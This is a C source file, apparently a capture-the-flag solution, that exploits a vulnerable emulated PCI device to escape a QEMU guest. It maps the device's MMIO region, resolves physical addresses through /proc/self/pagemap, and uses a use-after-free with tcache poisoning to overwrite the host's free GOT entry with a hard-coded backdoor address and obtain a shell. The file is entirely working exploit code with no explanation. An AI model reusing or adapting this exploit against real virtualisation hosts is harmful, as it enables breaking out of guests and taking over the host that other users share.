#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/io.h>

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

int fd, mmio_fd;
void *mmio_mem;

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    uint64_t pme, gfn;
    size_t offset;

    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;

    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

int init_mmio() {

    mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd < 0) {
        perror("open pci");
        return -1;
    }

    mmio_mem = mmap(0, 0x1000000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem < 0) {
        perror("mmap mmio_mem");
        return -1;
    }
    printf("mmio_mem: 0x%lx\n", (size_t) mmio_mem);

    return 0;
}

/* MMIO */
void add(int idx, int size) {
    int cmd = 0x0;
    int addr = 0xbabe | (cmd << 0x14) | (idx << 0x10);
    *(uint32_t *)((uint8_t *) mmio_mem + addr) = size / 8;
}

void del(int idx) {
    int cmd = 0x1;
    int addr = 0xbabe | (cmd << 0x14) | (idx << 0x10);
    *(uint32_t *)((uint8_t *) mmio_mem + addr) = 0xcafebabe;
}

void edit(int idx, int offset, int buf) {
    int cmd = 0x2;
    int addr = offset | (cmd << 0x14) | (idx << 0x10);
    *(uint32_t *)((uint8_t *) mmio_mem + addr) = buf;
}

uint32_t show(int idx, int offset) {
    int cmd = 0xf;
    int addr = offset | (cmd << 0x14) | (idx << 0x10);
    return *(uint32_t *)((uint8_t *) mmio_mem + addr);
}

// https://xz.aliyun.com/t/6778
int main() {
    int r = 0;
    void *userbuf;
    uint64_t phy_userbuf;

    fd = open("/proc/self/pagemap", O_RDONLY);
    if (!fd) {
        perror("open pagemap");
        return -1;
    }

    /* init MMIO */
    r = init_mmio();
    if (r == -1) {
        perror("init mmio");
        return -1;
    }

    /* allocate a user buffer */
    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (userbuf == MAP_FAILED) {
        perror("mmap userbuf");
        return -1;
    }
    mlock(userbuf, 0x1000);
    phy_userbuf = gva_to_gpa(userbuf);
    printf("userbuf: 0x%lx\n", (uint64_t) userbuf);
    printf("phy_userbuf: 0x%lx\n", phy_userbuf);

    /* Ubuntu 20.04 - with tcache */
    /* malloc a chunk */
    uint64_t backdoor = 0x00000000006E65F9;
    add(0, 0x370);
    for (int i = 0; i < 0x1000; i++) {
        add(1, 0x370);
    }

    /* uaf --> write free_got to fd */
    del(0);
    uint64_t free_got = 0x11301A0;
    edit(0, 0, free_got);

    /* get free_got chunk */
    add(1, 0x370);
    add(1, 0x370);
    edit(1, 0, backdoor);

    /* get shell */
    del(0);

    close(fd);
    close(mmio_fd);

    return 0;
}
